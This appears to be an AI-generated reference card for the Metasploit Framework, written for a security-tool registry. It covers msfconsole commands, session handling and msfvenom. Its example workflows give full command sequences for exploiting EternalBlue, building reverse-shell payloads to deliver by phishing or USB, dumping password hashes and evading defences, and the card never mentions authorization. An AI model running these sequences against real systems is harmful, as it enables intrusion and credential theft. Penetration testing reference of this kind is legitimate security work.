---
name: Metasploit Framework
description: Ruby-based penetration testing framework with exploit modules,
  payloads, and auxiliary tools for vulnerability assessment and exploitation
registry: security
tool_id: metasploit-framework
category: exploitation
tags:
  - exploitation
  - penetration-testing
  - post-exploitation
  - payload-generation
  - vulnerability-assessment
  - ruby
  - msfconsole
mitre_techniques:
  - T1190
  - T1203
  - T1068
  - T1059
  - T1046
  - T1595.002
  - T1210
  - T1569.002
summary: "Metasploit Framework is invoked via `msfconsole` (no args needed). Use
  for exploit delivery, payload generation (msfvenom), and post-exploitation.
  The framework provides 1600+ exploits across 25+ platforms and 500+ payloads.
  Critical workflow: search for modules using `search cve:YYYY-XXXX` or `search
  type:exploit platform:windows`, select with `use <module_path>`, configure
  with `set RHOST/LHOST/LPORT`, verify with `options` or `show options`,
  validate target with `check` if supported, then `exploit` or `run`. Sessions
  are managed via `sessions -l` (list), `sessions -i <id>` (interact), `sessions
  -u <id>` (upgrade shell to meterpreter). Use `show payloads` after selecting
  exploit to see compatible payloads. Database support required for workspace
  management; initialize with `msfdb init` if not configured. For payload
  generation outside console, use `msfvenom -p <payload> LHOST=<ip> LPORT=<port>
  -f <format> -o <outfile>`. Set global vars with `setg` to persist across
  modules. Use `jobs -l` to track background tasks, `kill <job_id>` to
  terminate. The `handler` command spins up listeners as background jobs.
  Modules are categorized: exploit (active exploitation), auxiliary
  (scanning/fuzzing), post (post-exploitation), payload (shellcode/stagers),
  encoder (evasion), nop (padding). Always validate module info with `info
  <module>` before use. Store command sequences with `makerc <file>`, replay
  with `resource <file>`. Metasploit updates frequently; expect module paths and
  options to shift between versions."
sources:
  - https://www.hackthebox.com/blog/metasploit-tutorial
  - https://www.varonis.com/blog/what-is-metasploit
  - https://www.freecodecamp.org/news/learn-metasploit-for-beginners/
  - https://www.kea.nu/files/textbooks/humblesec/metasploit_apenetrationtestersguide.pdf
  - https://help.rapid7.com/metasploit/Content/getting-started/gsg-pro.html
  - https://www.kali.org/tools/metasploit-framework/
  - https://www.offsec.com/metasploit-unleashed/msfconsole-commands/
  - https://docs.rapid7.com/metasploit/managing-metasploit/
  - https://www.offsec.com/metasploit-unleashed/msfconsole/
  - https://help.rapid7.com/metasploit/Content/getting-started/gsg-msf.html
  - https://docs.hacken.io/methodologies/red-team/
  - https://bishopfox.com/blog/2025-red-team-tools-c2-frameworks-active-directory-network-exploitation
generated_at: 2026-05-19T11:25:14.146Z
generated_by: anthropic
source_hash: 23dfab48a6befc5759a3817fd511228fb23f4e801ca037d915b39eb7a139e70e
---

# Metasploit Framework

## Overview

Metasploit Framework is an open-source, Ruby-based penetration testing platform providing modular exploit code, payloads, encoders, and auxiliary tools. It ships with 1677+ exploits for 25+ platforms (Windows, Linux, Android, PHP, Python, Java, Cisco) and nearly 500 payloads. The primary interface is msfconsole, a command-line console for module selection, configuration, and execution. Supporting tools include msfvenom (standalone payload generator replacing msfpayload/msfencode) and msf-egghunter. The framework supports clean session management, workspace organization, and database-backed tracking of targets and findings. Metasploit is updated dozens of times daily by Rapid7 and community contributors, making it highly volatile but current.

## When to use

Use Metasploit when you need to exploit known vulnerabilities (CVE-based exploits), deliver payloads to compromised targets, perform post-exploitation (credential harvesting, lateral movement, privilege escalation), or validate vulnerability scanner findings with active exploitation. It is ideal for: testing patch levels on production systems, demonstrating business risk of unpatched services, automating exploit delivery across multiple targets, generating custom payloads for social engineering or physical drops (USB, email), and pivoting through compromised hosts. Use auxiliary modules for non-exploit tasks: port scanning (auxiliary/scanner/portscan/tcp), service enumeration (SMB, HTTP, SSH brute-forcing), and vulnerability checks. Use post modules after gaining a session for credential dumping, registry manipulation, and persistence. Avoid when stealth is paramount (Metasploit signatures are well-known to EDR/IDS) or when exploit reliability is critical for production systems (some exploits cause crashes).

## Authentication & setup

Metasploit requires no authentication to the framework itself. On Kali Linux, it is pre-installed at /usr/share/metasploit-framework/. Launch with `msfconsole` from any terminal; use `msfconsole -q` for quiet mode (no banner). On first launch, initialize the PostgreSQL database with `msfdb init` (as root) to enable workspace and data tracking features. If database connection fails, check status with `msfdb status` and reinitialize if needed. On Windows, launch via Start Menu > Metasploit > Framework > Metasploit Console, or navigate to installation directory and run `console.bat`. If missing Ruby gems, run `bundle install` in the framework directory. Configure global options (LHOST for callbacks) with `setg LHOST <your_ip>` to avoid re-setting per module. Metasploit does not require outbound authentication, but some modules interact with external APIs (Shodan, VirusTotal) and require API keys set via module options or ~/.msf4/config files. For commercial Metasploit Pro, launch with `./msfpro` and authenticate to the web UI or Pro Console separately.

## Key commands / parameters

**Core navigation:** `help` (list commands), `search <keyword>` (find modules by CVE, platform, author, type), `use <module_path>` (load module), `back` (exit module context), `info <module>` (show module details, targets, references). **Configuration:** `show options` (display required/advanced settings), `set <OPTION> <value>` (configure module option), `setg <OPTION> <value>` (set globally), `unset/unsetg` (clear options), `show targets` (list exploit targets), `set TARGET <index>`, `show payloads` (compatible payloads for current exploit), `set PAYLOAD <payload_path>`. **Execution:** `check` (test if target is vulnerable without exploiting, if module supports it), `exploit` or `run` (execute module), `exploit -j` (run as background job), `exploit -z` (exploit and background session immediately). **Session management:** `sessions -l` (list active sessions), `sessions -i <id>` (interact with session), `sessions -u <id>` (upgrade shell to meterpreter), `sessions -k <id>` (kill session), `sessions -K` (kill all), `sessions -c <command>` (run command on session), `sessions -s <script>` (run script on session). **Jobs:** `jobs -l` (list background jobs), `jobs -k <id>` (kill job), `jobs -K` (kill all). **Database/Workspace:** `workspace` (list workspaces), `workspace -a <name>` (create), `workspace <name>` (switch), `workspace -d <name>` (delete), `db_nmap <args>` (run nmap and import results). **Handlers:** `handler -p <payload> -H <LHOST> -P <LPORT>` (spin up listener as background job). **Utility:** `connect <host> <port>` (netcat-like interaction), `load <plugin>` (load framework plugin), `resource <file>` (execute command script), `makerc <file>` (save command history), `save` (persist global settings). **msfvenom (standalone):** `msfvenom -p <payload> LHOST=<ip> LPORT=<port> -f <format> -o <file>` (generate payload; formats: exe, elf, raw, python, powershell, etc.), `msfvenom -l payloads` (list payloads), `msfvenom --list-formats` (output formats).

## Example workflows

**Exploit known vulnerability:** `msfconsole -q` → `search cve:2017-0144` (EternalBlue) → `use exploit/windows/smb/ms17_010_eternalblue` → `show options` → `set RHOSTS 192.168.1.50` → `set LHOST 192.168.1.100` → `check` (verify target vulnerable) → `exploit`. If successful, you receive a meterpreter session. **Upgrade shell to meterpreter:** Assume you have a basic shell on session 1: `sessions -u 1` → Metasploit attempts to upload and execute meterpreter stager. **Scan and exploit multiple targets:** `workspace -a red_team_op` → `db_nmap -sV -p 445 192.168.1.0/24` → `hosts` (list discovered), `services` (list services) → `use auxiliary/scanner/smb/smb_ms17_010` → `set RHOSTS 192.168.1.0/24` → `run` → Review results, identify vulnerable hosts → `use exploit/windows/smb/ms17_010_psexec` → `set RHOSTS <vulnerable_ip>` → `set LHOST <attacker_ip>` → `set PAYLOAD windows/x64/meterpreter/reverse_tcp` → `exploit -j` (background job). **Generate standalone payload:** `msfvenom -p windows/meterpreter/reverse_https LHOST=10.10.14.5 LPORT=443 -f exe -o payload.exe` → Set up listener in msfconsole: `use exploit/multi/handler` → `set PAYLOAD windows/meterpreter/reverse_https` → `set LHOST 10.10.14.5` → `set LPORT 443` → `exploit -j` → Deliver payload.exe to target via phishing or USB. **Post-exploitation:** Assume meterpreter session 2: `sessions -i 2` → `getuid` → `getsystem` (privilege escalation) → `hashdump` → `background` → `use post/windows/gather/credentials/credential_collector` → `set SESSION 2` → `run`.

## Output format

msfconsole output is plain text to stdout. Informational messages are prefixed with `[*]`, warnings with `[!]`, errors with `[-]`, and successes with `[+]`. Module execution (auxiliary, exploits) prints findings inline, often in table format (e.g., `hosts`, `services`, scan results). Session establishment prints `[*] Meterpreter session <id> opened`. Use `sessions -l` for tabular session list (ID, Type, Connection, Info). Database queries (`hosts`, `services`, `vulns`, `loot`, `creds`) return ASCII tables. To export results, use `hosts -o <file.csv>` or `services -o <file.xml>`. msfvenom writes binary payloads to specified output file; use `-f raw` for shellcode, `-f c` for C array, `-f python` for Python byte string. For structured logging, enable database mode and query PostgreSQL backend directly or export via Pro Console's reporting features. No native JSON output from msfconsole; parse text output or use `grep` inline with `grep <pattern> <command>` (e.g., `grep 445 services`). Session interaction (meterpreter, shell) outputs command results directly; capture with `sessions -c '<command>' -i <id>` to redirect to console.

## Common pitfalls

**Database not initialized:** Many features (workspaces, db_nmap, hosts/services commands) require PostgreSQL. If `db_status` shows disconnected, run `msfdb init` as root. **Wrong LHOST:** Setting LHOST to 127.0.0.1 or internal/NAT IP when target cannot route back causes payload callbacks to fail. Use externally routable IP or verify network path. **Payload/exploit mismatch:** Not all payloads work with all exploits; use `show payloads` after selecting exploit to see compatible options. Mismatched architecture (x86 vs x64) causes failures. **Target not vulnerable:** Many exploits are unreliable or target-specific. Use `check` command if supported, or test in lab before production use. Some exploits crash services (DoS risk). **Firewall/AV blocking callbacks:** Reverse payloads require target to connect back; firewalls, egress filtering, or endpoint protection may block. Use bind payloads (target listens) or HTTPS/DNS tunneling payloads for evasion. **Session dies immediately:** Staged payloads (e.g., windows/meterpreter/reverse_tcp) require handler running before execution. If handler isn't active, session fails. Use `exploit -j` to background handler or start handler first with `handler` command. **Module paths change:** Metasploit updates frequently; module paths in old documentation may be outdated. Use `search` to find current paths. **Insufficient permissions:** Exploits often require root/SYSTEM. Post-exploitation modules fail if session lacks privileges; escalate with `getsystem` (meterpreter) or use privilege escalation exploits. **Not backgrounding sessions:** Interacting with sessions blocks console; use `background` or Ctrl+Z to return to msfconsole prompt. **Forgetting to set required options:** `exploit` fails if required options (RHOSTS, LHOST, LPORT) are unset. Check `show options` and look for 'Required' column set to 'yes'.

## References

- https://www.hackthebox.com/blog/metasploit-tutorial
- https://www.varonis.com/blog/what-is-metasploit
- https://www.freecodecamp.org/news/learn-metasploit-for-beginners/
- https://www.kea.nu/files/textbooks/humblesec/metasploit_apenetrationtestersguide.pdf
- https://help.rapid7.com/metasploit/Content/getting-started/gsg-pro.html
- https://www.kali.org/tools/metasploit-framework/
- https://www.offsec.com/metasploit-unleashed/msfconsole-commands/
- https://docs.rapid7.com/metasploit/managing-metasploit/
- https://www.offsec.com/metasploit-unleashed/msfconsole/
- https://help.rapid7.com/metasploit/Content/getting-started/gsg-msf.html
